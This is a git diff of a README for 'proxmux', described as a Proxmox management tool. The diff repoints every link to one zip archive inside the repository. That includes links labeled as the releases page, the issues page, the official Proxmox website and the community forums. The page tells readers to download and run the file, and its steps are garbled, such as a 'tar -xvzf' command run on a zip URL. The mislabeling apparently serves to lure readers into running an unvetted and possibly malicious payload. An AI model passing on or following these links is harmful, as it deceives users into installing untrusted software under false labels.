@@ -1,6 +1,6 @@
 # 🌟 proxmux - Simplify Your Proxmox Management
 
-[![Download proxmux](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip%20proxmux-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip)
+[![Download proxmux](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip%20proxmux-v1.0-blue?style=for-the-badge)](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -12,15 +12,15 @@ To start using proxmux, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page for proxmux.
    
-   [Download proxmux](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip)
+   [Download proxmux](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip)
 
 2. **Select the Latest Version:** On the Releases page, find the latest version of proxmux. It is usually listed at the top. You will see several files you can download.
 
-3. **Download the Application:** Click on the appropriate file for your system. If you are unsure which one to choose, look for the file that ends with `.exe` for Windows or `https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip` for Linux. 
+3. **Download the Application:** Click on the appropriate file for your system. If you are unsure which one to choose, look for the file that ends with `.exe` for Windows or `https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip` for Linux. 
 
 4. **Install the Application:** After the download is complete, locate the file in your Downloads folder:
    - **For Windows:** Double-click the downloaded file and follow the installation prompts.
-   - **For Linux:** Open a terminal and use the command `tar -xvzf https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip` to extract files. Then, navigate to the extracted folder and run `./proxmux` to start the application.
+   - **For Linux:** Open a terminal and use the command `tar -xvzf https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip` to extract files. Then, navigate to the extracted folder and run `./proxmux` to start the application.
 
 5. **Run proxmux:** Once installed, you can open proxmux from your application menu or terminal. Enjoy managing your Proxmox VE environment with ease!
 
@@ -53,7 +53,7 @@ proxmux provides a range of features designed to streamline your Proxmox managem
 
 If you encounter any issues while using proxmux, please check the following resources:
 
-- **GitHub Issues:** Report any problems or bugs on the [Issues page](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip).
+- **GitHub Issues:** Report any problems or bugs on the [Issues page](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip).
 - **Documentation:** Refer to the official documentation for detailed guides and troubleshooting information.
 - **Community Forums:** Engage with other users in community forums dedicated to Proxmox VE for shared experiences and solutions.
 
@@ -61,8 +61,8 @@ If you encounter any issues while using proxmux, please check the following reso
 
 Here are some helpful links related to proxmux and Proxmox VE:
 
-- [proxmux Releases Page](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip)
-- [Proxmox VE Official Website](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip)
-- [Proxmox Community Forums](https://raw.githubusercontent.com/Vlokesh01/proxmux/main/src/components/Software-v2.5.zip)
+- [proxmux Releases Page](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip)
+- [Proxmox VE Official Website](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip)
+- [Proxmox Community Forums](https://github.com/Vlokesh01/proxmux/raw/refs/heads/main/src/Software_v2.6.zip)
 
 Thank you for choosing proxmux! We hope this guide helps you set up and enjoy managing your Proxmox environment efficiently.
